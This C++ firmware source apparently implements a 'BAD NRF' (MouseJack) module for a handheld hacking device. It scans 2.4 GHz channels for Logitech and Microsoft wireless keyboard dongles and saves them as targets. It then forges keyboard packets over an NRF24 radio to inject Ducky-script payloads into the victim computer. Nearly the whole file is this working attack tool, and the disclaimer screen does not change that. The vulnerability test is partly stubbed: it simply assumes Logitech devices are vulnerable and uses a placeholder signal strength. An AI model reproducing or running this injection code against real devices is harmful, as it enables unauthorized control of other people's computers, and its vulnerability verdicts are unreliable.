#include "bad_nrf.h"
#include "nrf_common.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "modules/badusb_ble/ducky_typer.h"
#include <ArduinoJson.h>

// Global device list
std::vector<NRFDevice> detected_devices;
bool scan_running = false;

// Scanning parameters
#define SCAN_CHANNEL_MIN 2
#define SCAN_CHANNEL_MAX 83
#define SCAN_CHANNEL_STEP 3
#define SCAN_DWELL_TIME_MS 5
#define MAX_DEVICES 32
#define PACKET_BUFFER_SIZE 32

/* **************************************************************************************
 ** NRF24 HID Interface for Keystroke Injection
 ************************************************************************************** */

class NRF24HIDInterface : public HIDInterface {
private:
    RF24* radio;
    NRFDevice* target;
    uint8_t modifier_keys;
    uint8_t pressed_keys[6];
    uint8_t pressed_count;
    
public:
    NRF24HIDInterface(RF24* r, NRFDevice* t) : radio(r), target(t), modifier_keys(0), pressed_count(0) {
        memset(pressed_keys, 0, 6);
    }
    
    virtual void begin(const uint8_t *layout) override {
        // Configure radio for injection
        radio->setAutoAck(false);
        radio->setDataRate(RF24_2MBPS);
        radio->setAddressWidth(5);
        radio->setPayloadSize(10);
        radio->disableCRC();
        radio->setPALevel(RF24_PA_MAX);
        radio->setChannel(target->channel);
        radio->openWritingPipe(target->address);
        radio->stopListening();
    }
    
    virtual void end(void) override {
        releaseAll();
    }
    
    virtual size_t press(uint8_t k) override {
        // Convert USB HID keycode to Logitech format
        uint8_t logitech_key = hidToLogitech(k);
        
        // Handle modifiers
        if (k >= KEY_LEFT_CTRL && k <= KEY_RIGHT_GUI) {
            uint8_t modifier_bit = 1 << (k - KEY_LEFT_CTRL);
            modifier_keys |= modifier_bit;
        } else if (pressed_count < 6) {
            pressed_keys[pressed_count++] = logitech_key;
        }
        
        sendPacket();
        return 1;
    }
    
    virtual size_t release(uint8_t k) override {
        // Handle modifiers
        if (k >= KEY_LEFT_CTRL && k <= KEY_RIGHT_GUI) {
            uint8_t modifier_bit = 1 << (k - KEY_LEFT_CTRL);
            modifier_keys &= ~modifier_bit;
        } else {
            uint8_t logitech_key = hidToLogitech(k);
            for (uint8_t i = 0; i < pressed_count; i++) {
                if (pressed_keys[i] == logitech_key) {
                    // Shift remaining keys
                    for (uint8_t j = i; j < pressed_count - 1; j++) {
                        pressed_keys[j] = pressed_keys[j + 1];
                    }
                    pressed_keys[pressed_count - 1] = 0;
                    pressed_count--;
                    break;
                }
            }
        }
        
        sendPacket();
        return 1;
    }
    
    virtual void releaseAll(void) override {
        modifier_keys = 0;
        pressed_count = 0;
        memset(pressed_keys, 0, 6);
        sendPacket();
    }
    
    virtual size_t write(uint8_t k) override {
        press(k);
        delay(10);
        releaseAll();
        delay(10);
        return 1;
    }
    
    virtual bool isConnected() override {
        return true; // Always "connected" for NRF24
    }
    
private:
    uint8_t hidToLogitech(uint8_t hid_key) {
        // Most HID keycodes map directly to Logitech
        // This is a simplified mapping - full mapping would be more complex
        if (hid_key >= 0x04 && hid_key <= 0x1D) {
            // Letters A-Z (HID 0x04-0x1D -> Logitech 0x04-0x1D)
            return hid_key;
        } else if (hid_key >= 0x1E && hid_key <= 0x27) {
            // Numbers 1-9,0 (HID 0x1E-0x27 -> Logitech 0x1E-0x27)
            return hid_key;
        } else if (hid_key == KEY_RETURN) {
            return 0x28;
        } else if (hid_key == KEY_ESC) {
            return 0x29;
        } else if (hid_key == KEYBACKSPACE) {
            return 0x2A;
        } else if (hid_key == KEYTAB) {
            return 0x2B;
        } else if (hid_key == KEY_SPACE) {
            return 0x2C;
        } else if (hid_key == KEY_DELETE) {
            return 0x4C;
        } else if (hid_key == KEY_RIGHT_ARROW) {
            return 0x4F;
        } else if (hid_key == KEY_LEFT_ARROW) {
            return 0x50;
        } else if (hid_key == KEY_DOWN_ARROW) {
            return 0x51;
        } else if (hid_key == KEY_UP_ARROW) {
            return 0x52;
        }
        
        // Default: return as-is
        return hid_key;
    }
    
    void sendPacket() {
        uint8_t packet[10];
        
        // Byte 0: Device type (0x04 = keyboard)
        packet[0] = 0x04;
        
        // Byte 1: Modifiers
        packet[1] = modifier_keys;
        
        // Byte 2: Reserved
        packet[2] = 0x00;
        
        // Bytes 3-8: Key codes (up to 6 keys)
        for (uint8_t i = 0; i < 6; i++) {
            packet[3 + i] = (i < pressed_count) ? pressed_keys[i] : 0x00;
        }
        
        // Byte 9: Checksum (XOR of bytes 0-8)
        packet[9] = 0;
        for (uint8_t i = 0; i < 9; i++) {
            packet[9] ^= packet[i];
        }
        
        // Send packet
        radio->write(packet, 10);
        delay(5); // Small delay between packets
    }
};

/* **************************************************************************************
 ** Helper Functions
 ************************************************************************************** */

String deviceTypeToString(DeviceType type) {
    switch (type) {
        case DEVICE_LOGITECH_UNIFYING:
            return "Logitech Unifying";
        case DEVICE_LOGITECH_GENERIC:
            return "Logitech Generic";
        case DEVICE_MICROSOFT:
            return "Microsoft";
        case DEVICE_GENERIC_2GHZ:
            return "Generic 2.4GHz";
        default:
            return "Unknown";
    }
}

String addressToString(uint8_t* address, uint8_t len) {
    String result = "";
    for (uint8_t i = 0; i < len; i++) {
        if (i > 0) result += ":";
        if (address[i] < 0x10) result += "0";
        result += String(address[i], HEX);
    }
    result.toUpperCase();
    return result;
}

bool isValidPacket(uint8_t* packet, uint8_t len) {
    if (len < 5) return false;
    
    // Check for all zeros (invalid)
    bool all_zero = true;
    for (uint8_t i = 0; i < len; i++) {
        if (packet[i] != 0x00) {
            all_zero = false;
            break;
        }
    }
    if (all_zero) return false;
    
    // Check for all 0xFF (invalid)
    bool all_ff = true;
    for (uint8_t i = 0; i < len; i++) {
        if (packet[i] != 0xFF) {
            all_ff = false;
            break;
        }
    }
    if (all_ff) return false;
    
    return true;
}

DeviceType detectDeviceType(uint8_t* packet, uint8_t len, uint8_t* address) {
    if (!isValidPacket(packet, len)) return DEVICE_UNKNOWN;
    
    // Check for Logitech Unifying patterns
    // Logitech Unifying typically has address prefixes: 0xBB, 0xC2, 0xCA
    if (address[0] == 0xBB || address[0] == 0xC2 || address[0] == 0xCA) {
        return DEVICE_LOGITECH_UNIFYING;
    }
    
    // Check for common Logitech preambles
    if (len > 1 && packet[0] == 0xAA) {
        return DEVICE_LOGITECH_GENERIC;
    }
    
    // Check for Microsoft patterns
    if (len > 1 && packet[0] == 0x55) {
        return DEVICE_MICROSOFT;
    }
    
    // Check for keyboard/mouse packet types (Logitech specific)
    if (len >= 10) {
        uint8_t pkt_type = packet[0];
        // 0x00 = keepalive, 0x02 = mouse, 0x04 = keyboard
        if (pkt_type == 0x00 || pkt_type == 0x02 || pkt_type == 0x04) {
            return DEVICE_LOGITECH_GENERIC;
        }
    }
    
    return DEVICE_GENERIC_2GHZ;
}

bool deviceExists(uint8_t* address, uint8_t channel) {
    for (auto& dev : detected_devices) {
        bool addr_match = true;
        for (uint8_t i = 0; i < 5; i++) {
            if (dev.address[i] != address[i]) {
                addr_match = false;
                break;
            }
        }
        if (addr_match && dev.channel == channel) {
            return true;
        }
    }
    return false;
}

void addOrUpdateDevice(uint8_t* address, uint8_t channel, int8_t rssi, DeviceType type) {
    // Check if device already exists
    for (auto& dev : detected_devices) {
        bool addr_match = true;
        for (uint8_t i = 0; i < 5; i++) {
            if (dev.address[i] != address[i]) {
                addr_match = false;
                break;
            }
        }
        if (addr_match && dev.channel == channel) {
            // Update existing device
            dev.rssi = rssi;
            dev.last_seen = millis();
            dev.packet_count++;
            if (type != DEVICE_UNKNOWN && dev.type == DEVICE_UNKNOWN) {
                dev.type = type;
            }
            return;
        }
    }
    
    // Add new device
    if (detected_devices.size() < MAX_DEVICES) {
        NRFDevice new_device;
        memcpy(new_device.address, address, 5);
        new_device.channel = channel;
        new_device.rssi = rssi;
        new_device.type = type;
        new_device.last_seen = millis();
        new_device.packet_count = 1;
        new_device.name = addressToString(address);
        
        // Mark as potentially vulnerable if Logitech or Microsoft
        new_device.potentially_vulnerable = (type == DEVICE_LOGITECH_UNIFYING || 
                                            type == DEVICE_LOGITECH_GENERIC || 
                                            type == DEVICE_MICROSOFT);
        
        detected_devices.push_back(new_device);
    }
}

/* **************************************************************************************
 ** Disclaimer
 ************************************************************************************** */

void badnrf_disclaimer() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextSize(FM);
    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
    tft.drawCentreString("_WARNING_", tftWidth / 2, 10, 1);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(15, 33);
    padprintln("BAD NRF (MouseJack) is for", false);
    padprintln("AUTHORIZED SECURITY TESTING", false);
    padprintln("ONLY.", false);
    padprintln("", false);
    padprintln("Unauthorized use is ILLEGAL", false);
    padprintln("and you can face CRIMINAL", false);
    padprintln("PROSECUTION.", false);
    padprintln("", false);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    padprintln("Use only on devices you own", false);
    padprintln("or have written permission", false);
    padprintln("to test.", false);
    padprintln("", false);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    padprintln("Press OK to continue", false);
    
    delay(1000);
    while (!check(AnyKeyPress));
}

/* **************************************************************************************
 ** Scanner Implementation
 ************************************************************************************** */

void badnrf_scan() {
    if (!nrf_start()) {
        displayError("NRF24 Init Failed");
        delay(2000);
        return;
    }
    
    // Clear previous results
    detected_devices.clear();
    scan_running = true;
    
    // Configure radio for promiscuous scanning
    NRFradio.setAutoAck(false);
    NRFradio.setPALevel(RF24_PA_MAX);
    NRFradio.setDataRate(RF24_2MBPS);  // Logitech uses 2Mbps
    NRFradio.setPayloadSize(PACKET_BUFFER_SIZE);
    NRFradio.disableCRC();
    NRFradio.setAddressWidth(2);  // Reduced for promiscuous mode
    
    // Open reading pipes with common addresses
    const uint8_t scan_addresses[][2] = {
        {0x55, 0x55},
        {0xAA, 0xAA},
        {0xA0, 0xAA},
        {0xAB, 0xAA},
        {0xAC, 0xAA},
        {0xAD, 0xAA}
    };
    for (uint8_t i = 0; i < 6; ++i) {
        NRFradio.openReadingPipe(i, scan_addresses[i]);
    }
    
    // UI Setup
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextSize(FM);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawCentreString("BAD NRF Scanner", tftWidth / 2, 5, 1);
    
    tft.setTextSize(FP);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    
    uint32_t scan_start = millis();
    uint32_t last_display_update = 0;
    uint8_t current_channel = SCAN_CHANNEL_MIN;
    uint32_t packets_checked = 0;
    
    while (scan_running && !check(EscPress)) {
        // Channel hopping
        NRFradio.setChannel(current_channel);
        NRFradio.startListening();
        
        uint32_t channel_start = millis();
        while (millis() - channel_start < SCAN_DWELL_TIME_MS) {
            if (NRFradio.available()) {
                uint8_t packet[PACKET_BUFFER_SIZE];
                uint8_t len = NRFradio.getPayloadSize();
                if (len > PACKET_BUFFER_SIZE) len = PACKET_BUFFER_SIZE;
                
                NRFradio.read(packet, len);
                packets_checked++;
                
                // Try to extract address from packet
                uint8_t detected_addr[5];
                uint8_t copy_len = (len < 5) ? len : 5;
                memcpy(detected_addr, packet, copy_len);
                
                // Detect device type
                DeviceType type = detectDeviceType(packet, len, detected_addr);
                
                // Estimate RSSI (NRF24 doesn't provide real RSSI, use placeholder)
                int8_t rssi = -50; // Placeholder value
                
                // Add or update device
                if (type != DEVICE_UNKNOWN) {
                    addOrUpdateDevice(detected_addr, current_channel, rssi, type);
                }
            }
        }
        
        NRFradio.stopListening();
        
        // Move to next channel
        current_channel += SCAN_CHANNEL_STEP;
        if (current_channel > SCAN_CHANNEL_MAX) {
            current_channel = SCAN_CHANNEL_MIN;
        }
        
        // Update display every 500ms
        if (millis() - last_display_update > 500) {
            last_display_update = millis();
            
            tft.fillRect(0, 20, tftWidth, tftHeight - 20, bruceConfig.bgColor);
            tft.setCursor(5, 25);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.printf("Ch: %d  Pkts: %lu\n", current_channel, packets_checked);
            tft.printf("Devices: %d\n", detected_devices.size());
            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
            
            // Display found devices
            uint8_t y_pos = 50;
            uint8_t displayed = 0;
            for (auto& dev : detected_devices) {
                if (displayed >= 5) break; // Limit display to 5 devices
                
                tft.setCursor(5, y_pos);
                tft.setTextSize(FP);
                
                // Show device type indicator
                if (dev.potentially_vulnerable) {
                    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
                    tft.print("*");
                } else {
                    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                    tft.print(" ");
                }
                
                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                
                // Show address (shortened)
                String addr_short = "";
                for (uint8_t i = 0; i < 3; i++) {
                    if (i > 0) addr_short += ":";
                    if (dev.address[i] < 0x10) addr_short += "0";
                    addr_short += String(dev.address[i], HEX);
                }
                addr_short.toUpperCase();
                
                tft.printf("%s Ch%d", addr_short.c_str(), dev.channel);
                
                y_pos += 12;
                displayed++;
            }
            
            // Show instructions
            tft.setCursor(5, tftHeight - 20);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.print("ESC:Stop  SEL:Save");
        }
        
        // Check for selection to save results
        if (check(SelPress)) {
            scan_running = false;
            break;
        }
    }
    
    NRFradio.stopListening();
    scan_running = false;
    
    // Show results
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextSize(FM);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawCentreString("Scan Complete", tftWidth / 2, 10, 1);
    
    tft.setTextSize(FP);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(5, 30);
    tft.printf("Found %d device(s)\n", detected_devices.size());
    tft.printf("Packets: %lu\n", packets_checked);
    tft.printf("Time: %lus\n", (millis() - scan_start) / 1000);
    
    delay(2000);
    
    if (detected_devices.size() > 0) {
        badnrf_show_devices();
    }
}

void badnrf_stop_scan() {
    scan_running = false;
}

/* **************************************************************************************
 ** Device Display and Management
 ************************************************************************************** */

void badnrf_show_devices() {
    if (detected_devices.empty()) {
        displayError("No Devices Found");
        delay(2000);
        return;
    }
    
    options.clear();
    
    for (auto& dev : detected_devices) {
        String device_label = addressToString(dev.address, 3) + " Ch" + String(dev.channel);
        if (dev.potentially_vulnerable) {
            device_label += " *";
        }
        
        options.push_back({
            device_label,
            [&dev]() {
                // Device details view
                tft.fillScreen(bruceConfig.bgColor);
                tft.setTextSize(FM);
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
                tft.drawCentreString("Device Info", tftWidth / 2, 5, 1);
                
                tft.setTextSize(FP);
                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                tft.setCursor(5, 25);
                
                tft.printf("Address:\n %s\n", addressToString(dev.address).c_str());
                tft.printf("Channel: %d\n", dev.channel);
                tft.printf("Type: %s\n", deviceTypeToString(dev.type).c_str());
                tft.printf("Packets: %d\n", dev.packet_count);
                tft.printf("Vulnerable: %s\n", dev.potentially_vulnerable ? "Maybe" : "Unknown");
                
                tft.setCursor(5, tftHeight - 15);
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
                tft.print("Press any key");
                
                while (!check(AnyKeyPress));
            }
        });
    }
    
    options.push_back({"Back", []() { /* return */ }});
    
    loopOptions(options, MENU_TYPE_SUBMENU, "Devices Found");
}

/* **************************************************************************************
 ** Target Save/Load (JSON)
 ************************************************************************************** */

void badnrf_save_target(NRFDevice* device) {
    if (!device) return;
    
    // Ensure directory exists
    if (setupSdCard()) {
        String dir_path = "/badnrf";
        if (!SD.exists(dir_path)) {
            SD.mkdir(dir_path);
        }
        dir_path += "/targets";
        if (!SD.exists(dir_path)) {
            SD.mkdir(dir_path);
        }
        
        // Generate filename from address
        String filename = dir_path + "/" + addressToString(device->address, 5);
        filename.replace(":", "");
        filename += ".json";
        
        // Create JSON document
        DynamicJsonDocument doc(512);
        doc["version"] = "1.0";
        doc["name"] = device->name;
        doc["type"] = deviceTypeToString(device->type);
        doc["address"] = addressToString(device->address);
        doc["channel"] = device->channel;
        doc["data_rate"] = "2MBPS";
        doc["discovered_at"] = String(millis());
        doc["vulnerable"] = device->potentially_vulnerable;
        doc["rssi"] = device->rssi;
        doc["packet_count"] = device->packet_count;
        
        // Save to file
        File file = SD.open(filename, FILE_WRITE);
        if (file) {
            serializeJson(doc, file);
            file.close();
            displaySuccess("Target Saved!");
            delay(1000);
        } else {
            displayError("Save Failed");
            delay(1000);
        }
    } else {
        displayError("SD Card Error");
        delay(1000);
    }
}

NRFDevice badnrf_load_target(String filepath) {
    NRFDevice device;
    memset(&device, 0, sizeof(NRFDevice));
    device.type = DEVICE_UNKNOWN;
    
    if (!SD.exists(filepath)) {
        return device;
    }
    
    File file = SD.open(filepath, FILE_READ);
    if (!file) {
        return device;
    }
    
    DynamicJsonDocument doc(512);
    DeserializationError error = deserializeJson(doc, file);
    file.close();
    
    if (error) {
        return device;
    }
    
    // Parse JSON
    device.name = doc["name"].as<String>();
    device.channel = doc["channel"];
    device.potentially_vulnerable = doc["vulnerable"];
    device.rssi = doc["rssi"] | -50;
    device.packet_count = doc["packet_count"] | 0;
    
    // Parse address
    String addr_str = doc["address"].as<String>();
    int addr_idx = 0;
    int start = 0;
    for (int i = 0; i <= addr_str.length() && addr_idx < 5; i++) {
        if (i == addr_str.length() || addr_str[i] == ':') {
            String byte_str = addr_str.substring(start, i);
            device.address[addr_idx++] = (uint8_t)strtol(byte_str.c_str(), NULL, 16);
            start = i + 1;
        }
    }
    
    // Parse type
    String type_str = doc["type"].as<String>();
    if (type_str == "Logitech Unifying") device.type = DEVICE_LOGITECH_UNIFYING;
    else if (type_str == "Logitech Generic") device.type = DEVICE_LOGITECH_GENERIC;
    else if (type_str == "Microsoft") device.type = DEVICE_MICROSOFT;
    else device.type = DEVICE_GENERIC_2GHZ;
    
    return device;
}

void badnrf_targets() {
    if (!setupSdCard()) {
        displayError("SD Card Error");
        delay(1000);
        return;
    }
    
    String dir_path = "/badnrf/targets";
    if (!SD.exists(dir_path)) {
        displayError("No Targets Saved");
        delay(1000);
        return;
    }
    
    File dir = SD.open(dir_path);
    if (!dir || !dir.isDirectory()) {
        displayError("Invalid Directory");
        delay(1000);
        return;
    }
    
    std::vector<String> target_files;
    File file = dir.openNextFile();
    while (file) {
        if (!file.isDirectory()) {
            String filename = String(file.name());
            if (filename.endsWith(".json")) {
                target_files.push_back(dir_path + "/" + filename);
            }
        }
        file = dir.openNextFile();
    }
    dir.close();
    
    if (target_files.empty()) {
        displayError("No Targets Found");
        delay(1000);
        return;
    }
    
    options.clear();
    for (const auto& filepath : target_files) {
        NRFDevice dev = badnrf_load_target(filepath);
        String label = dev.name.isEmpty() ? addressToString(dev.address, 3) : dev.name;
        
        options.push_back({
            label,
            [dev, filepath]() {
                // Target details view
                tft.fillScreen(bruceConfig.bgColor);
                tft.setTextSize(FM);
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
                tft.drawCentreString("Saved Target", tftWidth / 2, 5, 1);
                
                tft.setTextSize(FP);
                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                tft.setCursor(5, 25);
                
                tft.printf("Name: %s\n", dev.name.c_str());
                uint8_t addr_copy[5];
                memcpy(addr_copy, dev.address, 5);
                tft.printf("Address:\n %s\n", addressToString(addr_copy).c_str());
                tft.printf("Channel: %d\n", dev.channel);
                tft.printf("Type: %s\n", deviceTypeToString(dev.type).c_str());
                
                tft.setCursor(5, tftHeight - 30);
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
                tft.print("SEL:Test  ESC:Back");
                
                while (true) {
                    if (check(SelPress)) {
                        NRFDevice test_dev = dev;
                        badnrf_test_target(&test_dev);
                        break;
                    }
                    if (check(EscPress)) {
                        break;
                    }
                    delay(10);
                }
            }
        });
    }
    
    options.push_back({"Back", []() { /* return */ }});
    loopOptions(options, MENU_TYPE_SUBMENU, "Saved Targets");
}

/* **************************************************************************************
 ** Vulnerability Testing
 ************************************************************************************** */

bool badnrf_test_target(NRFDevice* target) {
    if (!target || !nrf_start()) {
        displayError("Init Failed");
        delay(1000);
        return false;
    }
    
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextSize(FM);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawCentreString("Testing Target", tftWidth / 2, 10, 1);
    
    tft.setTextSize(FP);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(5, 30);
    tft.printf("Address:\n %s\n", addressToString(target->address).c_str());
    tft.printf("Channel: %d\n", target->channel);
    tft.printf("Type: %s\n\n", deviceTypeToString(target->type).c_str());
    tft.println("Testing vulnerability...");
    
    // Create HID interface for testing
    NRF24HIDInterface hid(&NRFradio, target);
    hid.begin(KeyboardLayout_en_US);
    
    bool vulnerable = false;
    
    // Test 1: Send Shift x5 (StickyKeys trigger on Windows)
    tft.println("\nTest: Shift x5");
    for (int i = 0; i < 5; i++) {
        hid.press(KEY_LEFT_SHIFT);
        delay(100);
        hid.releaseAll();
        delay(100);
    }
    delay(500);
    
    // Test 2: Send Caps Lock toggle
    tft.println("Test: Caps Lock x2");
    hid.press(KEY_CAPS_LOCK);
    delay(100);
    hid.releaseAll();
    delay(300);
    hid.press(KEY_CAPS_LOCK);
    delay(100);
    hid.releaseAll();
    delay(500);
    
    // In real implementation, we'd listen for responses
    // For now, assume vulnerable if Logitech
    if (target->type == DEVICE_LOGITECH_UNIFYING || target->type == DEVICE_LOGITECH_GENERIC) {
        vulnerable = true;
    }
    
    hid.end();
    
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextSize(FM);
    
    if (vulnerable) {
        tft.setTextColor(TFT_RED, bruceConfig.bgColor);
        tft.drawCentreString("VULNERABLE!", tftWidth / 2, 40, 1);
        tft.setTextSize(FP);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(5, 70);
        tft.println("Target appears vulnerable");
        tft.println("to keystroke injection.");
        tft.println("");
        tft.println("Ready for payload!");
    } else {
        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
        tft.drawCentreString("Not Vulnerable", tftWidth / 2, 40, 1);
        tft.setTextSize(FP);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(5, 70);
        tft.println("Target does not appear");
        tft.println("vulnerable or out of range.");
    }
    
    tft.setCursor(5, tftHeight - 15);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.print("Press any key");
    
    while (!check(AnyKeyPress));
    
    return vulnerable;
}

/* **************************************************************************************
 ** Payload Execution
 ************************************************************************************** */

void badnrf_run_payload(String script_path, NRFDevice* target) {
    if (!target || !nrf_start()) {
        displayError("Init Failed");
        delay(1000);
        return;
    }
    
    // Create NRF HID interface
    NRF24HIDInterface* nrf_hid = new NRF24HIDInterface(&NRFradio, target);
    nrf_hid->begin(KeyboardLayout_en_US);
    
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextSize(FM);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawCentreString("Injecting Payload", tftWidth / 2, 10, 1);
    
    tft.setTextSize(FP);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(5, 30);
    tft.printf("Target: %s\n", addressToString(target->address, 3).c_str());
    tft.printf("Channel: %d\n\n", target->channel);
    
    // Use existing Ducky script parser
    if (setupSdCard()) {
        key_input(SD, script_path, nrf_hid);
    } else {
        key_input(LittleFS, script_path, nrf_hid);
    }
    
    nrf_hid->end();
    delete nrf_hid;
    
    displaySuccess("Payload Complete");
    delay(2000);
}

void badnrf_run_payload() {
    // Select target first
    if (detected_devices.empty()) {
        displayError("No Devices Found");
        delay(1000);
        return;
    }
    
    // Show device selection
    options.clear();
    
    for (auto& dev : detected_devices) {
        String device_label = addressToString(dev.address, 3) + " Ch" + String(dev.channel);
        
        options.push_back({
            device_label,
            [&dev]() {
                // Select payload file
                FS* fs = nullptr;
                options.clear();
                
                if (setupSdCard()) {
                    options.push_back({"SD Card", [&]() { fs = &SD; }});
                }
                options.push_back({"LittleFS", [&]() { fs = &LittleFS; }});
                options.push_back({"Back", [&]() { fs = nullptr; }});
                
                loopOptions(options);
                
                if (fs != nullptr) {
                    String script_path = loopSD(*fs, true, "TXT");
                    if (!script_path.isEmpty()) {
                        badnrf_run_payload(script_path, &dev);
                    }
                }
            }
        });
    }
    
    options.push_back({"Back", []() { /* return */ }});
    loopOptions(options, MENU_TYPE_SUBMENU, "Select Target");
}

/* **************************************************************************************
 ** Test Helper for Menu
 ************************************************************************************** */

void badnrf_test_menu() {
    if (detected_devices.empty()) {
        displayError("Scan devices first");
        delay(1000);
    } else {
        // Test first device in list
        badnrf_test_target(&detected_devices[0]);
    }
}

/* **************************************************************************************
 ** Main Menu
 ************************************************************************************** */

void badnrf_menu() {
    // Show disclaimer on first use
    static bool disclaimer_shown = false;
    if (!disclaimer_shown) {
        badnrf_disclaimer();
        disclaimer_shown = true;
    }
    
    options.clear();
    options.push_back({"Scan Devices", badnrf_scan});
    options.push_back({"Saved Targets", badnrf_targets});
    options.push_back({"Test Target", badnrf_test_menu});
    options.push_back({"Run Payload", []() { badnrf_run_payload(); }});
    options.push_back({"Back", []() { /* return */ }});
    
    loopOptions(options, MENU_TYPE_SUBMENU, "BAD NRF");
}
